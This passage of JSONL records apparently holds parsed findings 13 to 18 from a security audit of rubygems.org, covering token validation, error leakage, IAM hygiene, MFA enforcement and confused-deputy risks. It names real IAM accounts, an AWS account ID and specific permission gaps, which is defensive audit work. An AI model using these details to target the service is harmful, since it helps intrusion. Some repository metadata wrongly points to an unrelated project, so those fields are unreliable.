name:\n\"index_oidc_id_tokens_on_oidc_api_key_role_id\"\nend\n```\n\n*Figure 13.2: Missing constraint ensuring that the jti value is unique ([rubygems.org/db/schema.rb#L360–L368](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/db/schema.rb#L360-L368))*\n", "full_markdown": "## 13. The jti claim uniqueness is not enforced by database\n\n| Severity: Informational             | Diffi culty: Medium    |\n|----------------------------------------|------------------------------|\n| Type: Data Validation            | Finding ID: TOB-RGM-13 |\n| Target: app/models/oidc/id_token.rb |                              |\n\n#### Description\n\nThe jti claim from OIDC ID token is validated for uniqueness (figure 13.1), but this constraint is not enforced by the database (figure 13.2), which makes the application vulnerable to race conditions.\n\n```\ndef jti_uniqueness\n  relation = self.class.where(\"(jwt->>'claims')::jsonb->>'jti' = ?\", jti)\n  relation = relation.provider_id(api_key_role.oidc_provider_id) if api_key_role\n  return unless relation.where.not(id: self).exists?\n  errors.add(\"jwt.claims.jti\", \"must be unique\")\nend\n```\n\n*Figure 13.1: The jti claim uniqueness validation in application code ([rubygems.org/app/jobs/refresh\\\\_oidc\\\\_provider\\\\_job.rb#L7–L21](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/refresh_oidc_provider_job.rb#L7-L21))*\n\n```\ncreate_table \"oidc_id_tokens\", force: :cascade do |t|\n  t.bigint \"oidc_api_key_role_id\", null: false\n  t.jsonb \"jwt\", null: false\n  t.bigint \"api_key_id\"\n  t.datetime \"created_at\", null: false\n  t.datetime \"updated_at\", null: false\n  t.index [\"api_key_id\"], name: \"index_oidc_id_tokens_on_api_key_id\"\n  t.index [\"oidc_api_key_role_id\"], name:\n\"index_oidc_id_tokens_on_oidc_api_key_role_id\"\nend\n```\n\n*Figure 13.2: Missing constraint ensuring that the jti value is unique ([rubygems.org/db/schema.rb#L360–L368](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/db/schema.rb#L360-L368))*\n\n#### Recommendations\n\nShort term, add a check constraint to the oidc\\_id\\_tokens table to ensure that the jti value is unique even in face of a race condition in the application code.\n\nLong term, always add uniqueness constraints or indexes to the database to ensure data consistency.\n", "severity": "Informational", "difficulty": "Medium", "type": "Data Validation", "finding_id": "TOB-RGM-13", "target": {"path": "app/models/oidc/id_token.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "app/models/oidc/id_token.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Medium", "Type": "Data Validation", "Finding ID": "TOB-RGM-13", "Target": "app/models/oidc/id_token.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-014", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 14, "page_start": 43, "title": "Provider key age not checked", "short_summary": null, "description_md": "#### Description\n\nThe OIDC provider keys are periodically refreshed in a scheduled job. The application code does not check the key age before verifying the signature (figures 14.1, 14.2). If the scheduled refresh job fails for an extended period of time, the JWT signature verification could operate on an outdated, possibly compromised key.\n\n```\ndef verify_signature\n  raise UnsupportedIssuer, \"Provider is missing jwks\" if @provider.jwks.blank?\n  raise UnverifiedJWT, \"Invalid time\" unless\n(@jwt[\"nbf\"]..@jwt[\"exp\"]).cover?(Time.now.to_i)\n  @jwt.verify!(@provider.jwks)\nend\n```\n\n*Figure 14.1: Signature verification without checking the key age ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56) [#L52–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56))*\n\n```\ndef decode_jwt\n  raise UnverifiedJWT, \"Provider missing JWKS\" if @api_key_role.provider.jwks.blank?\n  @jwt = JSON::JWT.decode_compact_serialized(params.permit(:jwt).require(:jwt),\n@api_key_role.provider.jwks)\nrescue JSON::ParserError\n  raise UnverifiedJWT, \"Invalid JSON\"\nend\n```\n\n*Figure 14.2: Signature verification without checking the key age ([rubygems.org/app/controllers/api/v1/oidc/api\\\\_key\\\\_roles\\\\_controller.rb#L72](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/api_key_roles_controller.rb#L72-L77) [–L77](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/api_key_roles_controller.rb#L72-L77))*\n", "full_markdown": "## 14. Provider key age not checked\n\n| Severity: Informational | Diffi culty: High      |\n|----------------------------|------------------------------|\n| Type: Cryptography      | Finding ID: TOB-RGM-14 |\n|                            |                              |\n\nTarget: app/controllers/api/v1/oidc/trusted\\_publisher\\_controller.rb, app/controllers/api/v1/oidc/api\\_key\\_roles\\_controller.rb\n\n#### Description\n\nThe OIDC provider keys are periodically refreshed in a scheduled job. The application code does not check the key age before verifying the signature (figures 14.1, 14.2). If the scheduled refresh job fails for an extended period of time, the JWT signature verification could operate on an outdated, possibly compromised key.\n\n```\ndef verify_signature\n  raise UnsupportedIssuer, \"Provider is missing jwks\" if @provider.jwks.blank?\n  raise UnverifiedJWT, \"Invalid time\" unless\n(@jwt[\"nbf\"]..@jwt[\"exp\"]).cover?(Time.now.to_i)\n  @jwt.verify!(@provider.jwks)\nend\n```\n\n*Figure 14.1: Signature verification without checking the key age ([rubygems.org/app/controllers/api/v1/oidc/trusted\\\\_publisher\\\\_controller.rb](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56) [#L52–L56](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/trusted_publisher_controller.rb#L52-L56))*\n\n```\ndef decode_jwt\n  raise UnverifiedJWT, \"Provider missing JWKS\" if @api_key_role.provider.jwks.blank?\n  @jwt = JSON::JWT.decode_compact_serialized(params.permit(:jwt).require(:jwt),\n@api_key_role.provider.jwks)\nrescue JSON::ParserError\n  raise UnverifiedJWT, \"Invalid JSON\"\nend\n```\n\n*Figure 14.2: Signature verification without checking the key age ([rubygems.org/app/controllers/api/v1/oidc/api\\\\_key\\\\_roles\\\\_controller.rb#L72](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/api_key_roles_controller.rb#L72-L77) [–L77](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/oidc/api_key_roles_controller.rb#L72-L77))*\n\n#### Recommendations\n\nShort term, add a sanity check for the key age before verifying the JWT signature.\n", "severity": "Informational", "difficulty": "High", "type": "Cryptography", "finding_id": "TOB-RGM-14", "target": {"path": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Cryptography", "Finding ID": "TOB-RGM-14", "Target": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-015", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 15, "page_start": 44, "title": "Overly verbose error returned to the user", "short_summary": null, "description_md": "#### Description\n\nThe Pusher::pull\\_spec method contains a rescue clause that catches StandardError, which is almost equivalent to catching all exceptions. The exception message is included in the HTTP response. It is in principle unsafe to share arbitrary exception messages with users, as the message might contain sensitive information.\n\n```\nrescue StandardError => e\n  notify <<~MSG, 422\n    RubyGems.org cannot process this gem.\n    Please try rebuilding it and installing it locally to make sure it's valid.\n    Error:\n    #{e.message}\n  MSG\n```\n\n*Figure 15.1: The exception message is included in error message presented to users ([rubygems.org/app/models/pusher.rb#L87–L93](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/pusher.rb#L87-L93))*\n\n```\ngemcutter = Pusher.new(@api_key, request.body, request:)\ngemcutter.process\nrender plain: response_with_mfa_warning(gemcutter.message), status: gemcutter.code\n```\n\n*Figure 15.2: The message from figure 15.1 is rendered in the response ([rubygems.org/app/controllers/api/v1/rubygems\\\\_controller.rb#L37–L39](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/rubygems_controller.rb#L37-L39))*\n", "full_markdown": "## 15. Overly verbose error returned to the user\n\n| Severity: Informational                                                                                                         | Diffi culty: High      |\n|------------------------------------------------------------------------------------------------------------------------------------|------------------------------|\n| Type: Data Exposure                                                                                                          | Finding ID: TOB-RGM-15 |\n| Target: app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb |                              |\n\n#### Description\n\nThe Pusher::pull\\_spec method contains a rescue clause that catches StandardError, which is almost equivalent to catching all exceptions. The exception message is included in the HTTP response. It is in principle unsafe to share arbitrary exception messages with users, as the message might contain sensitive information.\n\n```\nrescue StandardError => e\n  notify <<~MSG, 422\n    RubyGems.org cannot process this gem.\n    Please try rebuilding it and installing it locally to make sure it's valid.\n    Error:\n    #{e.message}\n  MSG\n```\n\n*Figure 15.1: The exception message is included in error message presented to users ([rubygems.org/app/models/pusher.rb#L87–L93](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/pusher.rb#L87-L93))*\n\n```\ngemcutter = Pusher.new(@api_key, request.body, request:)\ngemcutter.process\nrender plain: response_with_mfa_warning(gemcutter.message), status: gemcutter.code\n```\n\n*Figure 15.2: The message from figure 15.1 is rendered in the response ([rubygems.org/app/controllers/api/v1/rubygems\\\\_controller.rb#L37–L39](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/rubygems_controller.rb#L37-L39))*\n\n#### Recommendations\n\nShort term, remove the exception message from the StandardError handling in Pusher::pull\\_spec. Alternatively, add more granular exception handling with specialized error messages.\n\nLong term, avoid showing arbitrary error messages to untrusted parties, as they could contain sensitive information.\n", "severity": "Informational", "difficulty": "High", "type": "Data Exposure", "finding_id": "TOB-RGM-15", "target": {"path": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/prowler-cloud/prowler", "org": "prowler-cloud", "name": "prowler", "commit": null, "branch": null, "relative_file": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Exposure", "Finding ID": "TOB-RGM-15", "Target": "app/controllers/api/v1/oidc/trusted_publisher_controller.rb, app/controllers/api/v1/oidc/api_key_roles_controller.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-016", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 16, "page_start": 45, "title": "Redundant IAM users and permissions", "short_summary": null, "description_md": "#### Description\n\nThe system contains a few IAM resources that appear not to be used and should be removed. Additionally, a few resources that could be more restricted; while not easily exploitable, these resources do not follow the principle of least privilege.\n\nThe below IAM users appear not to be used:\n\n- chef: this account has some write privileges to EC2 and Route53, does not have any access credentials, has MFA disabled, and has never been used (according to Access Advisor).\n- nick: this account has administrative access, has only one inactive access key configured, has MFA disabled, and has never been used (according to Access Advisor).\n\nThe following IAM users were used long time ago and may be no longer needed:\n\n- evan: this account has administrative access, does not have any access credentials, MFA is disabled, was used 2 years ago last time\n- dwradcliffe: this account has administrative access and was used 2 years ago last time\n- hsbt: this account has privileges for ECS and production S3 buckets, was used 1 year ago for S3 access and never used other privileges\n- marty: this administrative account is actively used, but with an old and unused access key.\n- mux: this account with read-write S3 privileges, MFA is disabled\n  - The account has redundant S3:CreateJob permission for all resources\n  - Other write permissions are insecurely restricted to arn:aws:s3:::\\*videos\\* resources: this gives access to, for example, production gems with \"videos\" in their name\n\nThe following roles appear to have been created for OpsWorks [service that](https://docs.aws.amazon.com/opsworks/latest/userguide/welcome.html) reached end of [life:](https://docs.aws.amazon.com/opsworks/latest/userguide/welcome.html)\n\n\n\n- aws-opsworks-ec2-role\n- aws-opsworks-service-role\n\nPlease note that the chef IAM user could be created for this service as well.\n\nMultiple customer-managed policies do not have any entities attached:\n\n- KarpenterController-2024021715281315410000000b\n- es-staging-app\n- rubyapi-secrets-manager-read-write\n- RubyAPITerraformCloud (not used after fix for [TOB-RGM-20\\)](#page-52-0)\n- aws-load-balancer-controller (may be important for Helm configuration)\n\nAdditionally, we noted the following issues:\n\n- The everything-backup policy (inlined in the dwradcliffe user) grants all privileges on all resources, instead of read-only privileges.\n- The Setup user group has no users assigned, so it can probably be removed.\n- The shipit IAM user is included in the K8s system:masters group, but the IAM user does not exist.\n", "full_markdown": "| 16. Redundant IAM users and permissions |                              |  |\n|--------------------------------------------------------|------------------------------|--|\n| Severity: Medium                                    | Diffi culty: High      |  |\n| Type: Authentication                                | Finding ID: TOB-RGM-16 |  |\n| Target: AWS IAM                                  |                              |  |\n\n#### Description\n\nThe system contains a few IAM resources that appear not to be used and should be removed. Additionally, a few resources that could be more restricted; while not easily exploitable, these resources do not follow the principle of least privilege.\n\nThe below IAM users appear not to be used:\n\n- chef: this account has some write privileges to EC2 and Route53, does not have any access credentials, has MFA disabled, and has never been used (according to Access Advisor).\n- nick: this account has administrative access, has only one inactive access key configured, has MFA disabled, and has never been used (according to Access Advisor).\n\nThe following IAM users were used long time ago and may be no longer needed:\n\n- evan: this account has administrative access, does not have any access credentials, MFA is disabled, was used 2 years ago last time\n- dwradcliffe: this account has administrative access and was used 2 years ago last time\n- hsbt: this account has privileges for ECS and production S3 buckets, was used 1 year ago for S3 access and never used other privileges\n- marty: this administrative account is actively used, but with an old and unused access key.\n- mux: this account with read-write S3 privileges, MFA is disabled\n  - The account has redundant S3:CreateJob permission for all resources\n  - Other write permissions are insecurely restricted to arn:aws:s3:::\\*videos\\* resources: this gives access to, for example, production gems with \"videos\" in their name\n\nThe following roles appear to have been created for OpsWorks [service that](https://docs.aws.amazon.com/opsworks/latest/userguide/welcome.html) reached end of [life:](https://docs.aws.amazon.com/opsworks/latest/userguide/welcome.html)\n\n\n\n- aws-opsworks-ec2-role\n- aws-opsworks-service-role\n\nPlease note that the chef IAM user could be created for this service as well.\n\nMultiple customer-managed policies do not have any entities attached:\n\n- KarpenterController-2024021715281315410000000b\n- es-staging-app\n- rubyapi-secrets-manager-read-write\n- RubyAPITerraformCloud (not used after fix for [TOB-RGM-20\\)](#page-52-0)\n- aws-load-balancer-controller (may be important for Helm configuration)\n\nAdditionally, we noted the following issues:\n\n- The everything-backup policy (inlined in the dwradcliffe user) grants all privileges on all resources, instead of read-only privileges.\n- The Setup user group has no users assigned, so it can probably be removed.\n- The shipit IAM user is included in the K8s system:masters group, but the IAM user does not exist.\n\n#### Exploit Scenario 1\n\nThe evan user reuses his AWS password for another popular service. The other service suffers from data breach, and passwords are leaked. Mallory finds evan's password in the data dump; because MFA is disabled, Mallory successfully logs in as evan with only his password. Mallory has admin access to all rubygems production resources and silently installs backdoors in popular gems.\n\n#### Exploit Scenario 2\n\nThe Mux user becomes malicious and backdoors all 23 gems with \"videos\" in their name.\n\n#### Recommendations\n\nShort term, review the IAM resources pointed out in this finding, remove redundant resources, and restrict privileges of other resources according to the principle of least privilege. The precise actions required to do this depend on the business context that is unknown to Trail of Bits; nevertheless, consider the following actions:\n\n- For IAM users:\n  - Remove the check and nick IAM users.\n  - Enable MFA for the evan and Mux users.\n  - Remove dwradcliffe's everything-backup policy.\n  - Limit hsbt's privileges to S3 buckets.\n\n\n\n- Remove the marty user's access key.\n- Remove Mux's S3:CreateJob permission.\n- Restrict Mux's write permissions to specific S3 buckets and objects (instead of the broad \\*videos\\* pattern).\n- Remove OpsWorks-related roles. Remove unused policies. Remove the Setup user group.\n- Ensure that the root account has MFA enabled.\n- Adjust EKS' kubernetes\\_config\\_map (in eks.tf file) and kubernetes\\_role\\_binding resources (k8s-rbac.tf file) to match current IAM resources. Add a step to the development and PR review processes that would require review of K8s configurations whenever IAM resources are changed (and vice versa).\n- Long term, periodically review IAM resources and remove redundant ones.\n- Move away from manual management of IAM resources. Migrate the management to Terraform. Once the migration is complete, limit users and roles with write access to production resources; ideally, only CI/CD pipeline and a break-glass user should have access.\n- When creating or updating IAM resources, ask for peer review of the new configurations. This review should be made a required step in GitHub, and should check if the new permissions are minimal.\n- Whenever possible, migrate inlined and attached policies to groups and roles. This will reduce the possibility of granting over-privileged accesses.\n- Add AWS Config rules that would automate maintenance: remove inactive IAM resources and disallow insecure configurations. Review [asecurecloud's](https://asecure.cloud/l/p_conformance_packs/) conformance [packs](https://asecure.cloud/l/p_conformance_packs/) for additional rules.\n", "severity": "Medium", "difficulty": "High", "type": "Authentication", "finding_id": "TOB-RGM-16", "target": {"path": "AWS IAM", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/prowler-cloud/prowler", "org": "prowler-cloud", "name": "prowler", "commit": null, "branch": null, "relative_file": "AWS IAM", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Authentication", "Finding ID": "TOB-RGM-16", "Target": "AWS IAM"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-017", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 17, "page_start": 48, "title": "MFA is not enforced for IAM user", "short_summary": null, "description_md": "#### Description\n\nMFA is not enforced on the account or organization level. IAM users are allowed to perform actions in AWS without MFA enabled.\n\nWhile all active users currently have MFA configured, a global enforcement of MFA is strongly recommended.\n\nPlease note that the Force\\_MFA policy exists, but it does not serve the purpose of global enforcement: it is attached only to the SRE user group. Moreover, it contains a bug: the s3:ListBuckets permission is incorrect (should be s3:ListBucket).\n", "full_markdown": "# 17. MFA is not enforced for IAM user\n\n| Severity: Medium                                                   | Diffi culty: High      |\n|-----------------------------------------------------------------------|------------------------------|\n| Type: Authentication                                               | Finding ID: TOB-RGM-17 |\n| Target: AWS IAM, AWS Config, AWS Identity Center |                              |\n\n#### Description\n\nMFA is not enforced on the account or organization level. IAM users are allowed to perform actions in AWS without MFA enabled.\n\nWhile all active users currently have MFA configured, a global enforcement of MFA is strongly recommended.\n\nPlease note that the Force\\_MFA policy exists, but it does not serve the purpose of global enforcement: it is attached only to the SRE user group. Moreover, it contains a bug: the s3:ListBuckets permission is incorrect (should be s3:ListBucket).\n\n#### Exploit Scenario\n\nA new user is added to the AWS IAM. The user forgets to configure MFA. Some time later, Mallory compromises the user's password via phishing. Mallory logs in to AWS.\n\n#### Recommendations\n\nShort term, create a AWS Config check to [enforce MFA](https://docs.aws.amazon.com/config/latest/developerguide/iam-user-mfa-enabled.html) or enable [IAM Identity](https://docs.aws.amazon.com/singlesignon/latest/userguide/how-to-configure-mfa-device-enforcement.html) Center and [enable enforcement.](https://docs.aws.amazon.com/singlesignon/latest/userguide/how-to-configure-mfa-device-enforcement.html) Ensure that root accounts have strong MFA enabled.\n\nLong term, use only hardware security keys for MFA, as these types of authenticators provide the strongest security. Administrators especially should use this MFA option. Configure at least two keys: one for day-to-day use and one as a backup.\n", "severity": "Medium", "difficulty": "High", "type": "Authentication", "finding_id": "TOB-RGM-17", "target": {"path": "AWS IAM, AWS Config, AWS Identity Center", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/prowler-cloud/prowler", "org": "prowler-cloud", "name": "prowler", "commit": null, "branch": null, "relative_file": "AWS IAM, AWS Config, AWS Identity Center", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Authentication", "Finding ID": "TOB-RGM-17", "Target": "AWS IAM, AWS Config, AWS Identity Center"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-018", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 18, "page_start": 49, "title": "Lack of policy conditions leading to cross-service confused deputy attacks", "short_summary": null, "description_md": "#### Description\n\nSome AWS services are granted sts:AssumeRole permission without any policy condition, and are potentially vulnerable to [cross-service confused](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html#cross-service-confused-deputy-prevention) deputy attacks.\n\nIt is not clear if the issues are really exploitable, and if other services with the sts:AssumeRole permission are not vulnerable; AWS [documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourcearn) states that only [some services](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourcearn) support mitigations for this attack vector. For the three services indicated below, we found explicit documentation for mitigating the confused deputy attack.\n\n- [arn:aws:iam::048268392960:role/rds-monitoring-role](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_Monitoring.OS.Enabling.html#USER_Monitoring.OS.confused-deputy)\n- [arn:aws:iam::048268392960:role/vpc-flow-log-role-20240501052116925800000002](https://docs.aws.amazon.com/vpc/latest/tgw/flow-logs-cwl.html)\n- [arn:aws:iam::048268392960:role/aws-opsworks-service-role](https://docs.aws.amazon.com/opsworks/latest/userguide/cross-service-confused-deputy-prevention-stacks.html)\n\nOther services are also missing policy conditions, but we found no similar AWS recommendations and therefore assume that no steps are needed. We still recommend mitigating the attack for extra safety, although implementing mitigations in some services may break the system and should be preceded by careful investigation.\n", "full_markdown": "# 18. Lack of policy conditions leading to cross-service confused deputy attacks\n\n| Severity: Low            | Diffi culty: Medium    |\n|-----------------------------|------------------------------|\n| Type: Access Controls | Finding ID: TOB-RGM-18 |\n| Target: AWS IAM roles |                              |\n\n#### Description\n\nSome AWS services are granted sts:AssumeRole permission without any policy condition, and are potentially vulnerable to [cross-service confused](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html#cross-service-confused-deputy-prevention) deputy attacks.\n\nIt is not clear if the issues are really exploitable, and if other services with the sts:AssumeRole permission are not vulnerable; AWS [documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourcearn) states that only [some services](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourcearn) support mitigations for this attack vector. For the three services indicated below, we found explicit documentation for mitigating the confused deputy attack.\n\n- [arn:aws:iam::048268392960:role/rds-monitoring-role](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_Monitoring.OS.Enabling.html#USER_Monitoring.OS.confused-deputy)\n- [arn:aws:iam::048268392960:role/vpc-flow-log-role-20240501052116925800000002](https://docs.aws.amazon.com/vpc/latest/tgw/flow-logs-cwl.html)\n- [arn:aws:iam::048268392960:role/aws-opsworks-service-role](https://docs.aws.amazon.com/opsworks/latest/userguide/cross-service-confused-deputy-prevention-stacks.html)\n\nOther services are also missing policy conditions, but we found no similar AWS recommendations and therefore assume that no steps are needed. We still recommend mitigating the attack for extra safety, although implementing mitigations in some services may break the system and should be preceded by careful investigation.\n\n#### Exploit Scenario\n\nAn attacker creates a new AWS account and configures a RDS service to write logs to RubyGems' RDS logs.\n\n#### Recommendations\n\nShort term, mitigate the confused deputy attacks by adding relevant aws: conditions to the policies of roles listed in the Description section above.\n\nConsider implementing mitigations for the following lambda roles. (Note that mitigations for lambda service may be not necessary and are not documented by AWS, but [should](https://github.com/prowler-cloud/prowler/issues/2810#issuecomment-1795492940) still [work.](https://github.com/prowler-cloud/prowler/issues/2810#issuecomment-1795492940))\n\n● arn:aws:iam::048268392960:role/lambda\\_s3\\_exec\\_role\n\n\n\n- arn:aws:iam::048268392960:role/lambda-basic-exec-role\n- arn:aws:iam::048268392960:role/SlackNotifier-LambdaFunctionRole-1 2R6ZJ2BX3B1W\n- arn:aws:iam::048268392960:role/SlackNotifier-LambdaFunctionRole-1 941TUMK699WF\n\nLong term, review security documentation for AWS services that will be enabled for RubyGems. Some important configuration options may be specific to the service and \"hidden\" inside its documentation.\n\n#### References\n\n- [aws:SourceArn](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourcearn) documentation\n- Summit Route, 2019.04.03, [\"Advanced](https://summitroute.com/blog/2019/04/03/advanced_aws_policy_auditing_confused_deputies_with_aws_services/) AWS policy auditing Confused deputies with AWS [services\"](https://summitroute.com/blog/2019/04/03/advanced_aws_policy_auditing_confused_deputies_with_aws_services/)\n", "severity": "Low", "difficulty": "Medium", "type": "Access Controls", "finding_id": "TOB-RGM-18", "target": {"path": "AWS IAM roles", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/prowler-cloud/prowler", "org": "prowler-cloud", "name": "prowler", "commit": null, "branch": null, "relative_file": "AWS IAM roles", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Medium", 